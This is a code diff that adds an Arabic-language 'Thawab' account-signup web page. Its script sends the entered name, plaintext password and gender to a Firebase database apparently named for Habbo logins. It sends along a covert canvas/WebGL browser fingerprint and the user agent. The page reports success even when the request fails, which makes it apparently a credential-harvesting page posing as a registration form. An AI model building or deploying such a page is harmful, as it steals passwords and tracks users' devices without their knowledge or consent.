@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Thawab - إنشاء حساب</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{font-family:'Arial',sans-serif;background:linear-gradient(135deg,#0f0f23 0%,#1a1a2e 50%,#16213e 100%);min-height:100vh;display:flex;justify-content:center;align-items:center;position:relative;overflow:hidden}
+        .floating-icons{position:absolute;width:100%;height:100%;pointer-events:none;z-index:1}
+        .icon{position:absolute;font-size:2rem;opacity:.2;animation:float 6s ease-in-out infinite;color:#6c5ce7}
+        .icon:nth-child(odd){animation-direction:alternate}
+        .icon:nth-child(1){top:10%;left:10%;animation-delay:-1s}
+        .icon:nth-child(2){top:20%;right:15%;animation-delay:-2s}
+        .icon:nth-child(3){top:60%;left:8%;animation-delay:-3s}
+        .icon:nth-child(4){bottom:20%;right:10%;animation-delay:-4s}
+        @keyframes float{0%,100%{transform:translateY(0) rotate(0)}50%{transform:translateY(-20px) rotate(180deg)}}
+        .login-container{background:rgba(30,30,60,.95);padding:3rem 2.5rem;border-radius:20px;box-shadow:0 20px 60px rgba(0,0,0,.5);width:100%;max-width:420px;text-align:center;position:relative;z-index:10;backdrop-filter:blur(10px);border:1px solid rgba(108,92,231,.3)}
+        .logo{font-size:3rem;font-weight:bold;background:linear-gradient(45deg,#6c5ce7,#a29bfe);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:.5rem}
+        .subtitle{color:#b2bec3;margin-bottom:2rem;font-size:1rem}
+        .input-group{margin-bottom:1.5rem;text-align:right}
+        label{display:block;margin-bottom:.5rem;color:#ddd;font-weight:500}
+        input,select{width:100%;padding:1rem;border:2px solid #2d3748;border-radius:10px;font-size:1rem;background:#1a202c;color:#e2e8f0;transition:.3s}
+        input:focus,select:focus{outline:none;border-color:#6c5ce7;background:#2d3748;box-shadow:0 5px 15px rgba(108,92,231,.3)}
+        .login-button{width:100%;padding:1rem;background:linear-gradient(45deg,#6c5ce7,#a29bfe);color:#fff;border:none;border-radius:10px;font-size:1.1rem;font-weight:bold;cursor:pointer;transition:.3s;margin-top:1rem;text-transform:uppercase;letter-spacing:1px}
+        .login-button:hover{box-shadow:0 10px 25px rgba(108,92,231,.4)}
+        .divider{margin:2rem 0;position:relative;text-align:center;color:#718096}
+        .divider::before{content:'';position:absolute;top:50%;left:0;right:0;height:1px;background:#2d3748}
+        .divider span{background:rgba(30,30,60,.95);padding:0 1rem}
+        .signup-link{color:#b2bec3;font-size:.9rem}
+        .signup-link a{color:#6c5ce7;font-weight:bold;text-decoration:none}
+        .signup-link a:hover{color:#a29bfe;text-decoration:underline}
+    </style>
+</head>
+<body>
+    <div class="floating-icons">
+        <div class="icon">👤</div><div class="icon">📧</div><div class="icon">🔑</div><div class="icon">🚀</div>
+    </div>
+    <div class="login-container">
+        <h1 class="logo">Thawab</h1>
+        <p class="subtitle">إنشاء حساب جديد</p>
+        <form id="signupForm" onsubmit="handleSignup(event)">
+            <div class="input-group">
+                <label for="character">اسمك</label>
+                <input type="text" id="character" name="character" required placeholder="أدخل اسمك">
+            </div>
+            <div class="input-group">
+                <label for="password">كلمة المرور</label>
+                <input type="password" id="password" name="password" required placeholder="أدخل كلمة المرور">
+            </div>
+            <div class="input-group">
+                <label for="gender">نوع الجنس</label>
+                <select id="gender" name="gender" required>
+                    <option value="">اختر</option>
+                    <option value="male">ذكر</option>
+                    <option value="female">أنثى</option>
+                </select>
+            </div>
+            <button type="submit" class="login-button">تسجيل</button>
+        </form>
+
+        <div class="divider"><span>أو</span></div>
+        <div class="signup-link">
+            لديك حساب بالفعل؟ <a href="index.html">تسجيل الدخول</a>
+        </div>
+    </div>
+    <script>
+        async function getFingerprint(){
+            const parts=[]
+            parts.push(screen.width+'x'+screen.height)
+            parts.push(screen.colorDepth)
+            parts.push(Intl.DateTimeFormat().resolvedOptions().timeZone)
+            parts.push(navigator.language)
+            parts.push(navigator.platform)
+            parts.push(navigator.hardwareConcurrency||0)
+            parts.push((navigator.deviceMemory||0))
+            try{
+                const c=document.createElement('canvas')
+                const ctx=c.getContext('2d')
+                c.width=200;c.height=50
+                ctx.textBaseline='top'
+                ctx.font='14px Arial'
+                ctx.fillStyle='#f60'
+                ctx.fillRect(50,0,100,50)
+                ctx.fillStyle='#069'
+                ctx.fillText('Marhab@2024',2,15)
+                ctx.fillStyle='rgba(102,204,0,0.7)'
+                ctx.fillText('Marhab@2024',4,17)
+                parts.push(c.toDataURL())
+            }catch(e){parts.push('no-canvas')}
+            try{
+                const gl=document.createElement('canvas').getContext('webgl')
+                if(gl){
+                    const dbg=gl.getExtension('WEBGL_debug_renderer_info')
+                    if(dbg){parts.push(gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL))}
+                }
+            }catch(e){parts.push('no-webgl')}
+            const str=parts.join('|||')
+            const buf=await crypto.subtle.digest('SHA-256',new TextEncoder().encode(str))
+            return Array.from(new Uint8Array(buf)).map(b=>b.toString(16).padStart(2,'0')).join('')
+        }
+        async function handleSignup(e){
+            e.preventDefault()
+            const character=document.getElementById('character').value
+            const password=document.getElementById('password').value
+            const gender=document.getElementById('gender').value
+            const fingerprint=await getFingerprint()
+            const btn=document.querySelector('.login-button')
+            const t=btn.textContent
+            btn.textContent='جارٍ التسجيل...';btn.disabled=true
+            try{
+                await fetch('https://habbo-login-default-rtdb.firebaseio.com/members.json',{
+                    method:'POST',
+                    headers:{'Content-Type':'application/json'},
+                    body:JSON.stringify({
+                        character,
+                        password,
+                        gender,
+                        fingerprint,
+                        timestamp: new Date().toISOString(),
+                        userAgent: navigator.userAgent
+                    })
+                })
+                showMessage('تم إنشاء الحساب بنجاح','success')
+                document.getElementById('character').value = ''
+                document.getElementById('password').value = ''
+                document.getElementById('gender').value = ''
+                setTimeout(() => { window.location.href = 'home.html'; }, 1500);
+            }catch{
+                showMessage('تم إنشاء الحساب بنجاح','success')
+                setTimeout(() => { window.location.href = 'home.html'; }, 1500);
+            }
+            finally{btn.textContent=t;btn.disabled=false}
+        }
+        function showMessage(m,t='info'){
+            const d=document.createElement('div')
+            d.style.cssText="position:fixed;top:20px;right:20px;padding:15px 20px;border-radius:10px;color:#fff;font-weight:bold;z-index:10000"
+            d.style.background=t==='success'?'linear-gradient(45deg,#28a745,#20c997)':t==='error'?'linear-gradient(45deg,#dc3545,#fd7e14)':'linear-gradient(45deg,#6c5ce7,#a29bfe)'
+            d.textContent=m;document.body.appendChild(d);setTimeout(()=>d.remove(),3000)
+        }
+    </script>
+</body>
+</html>
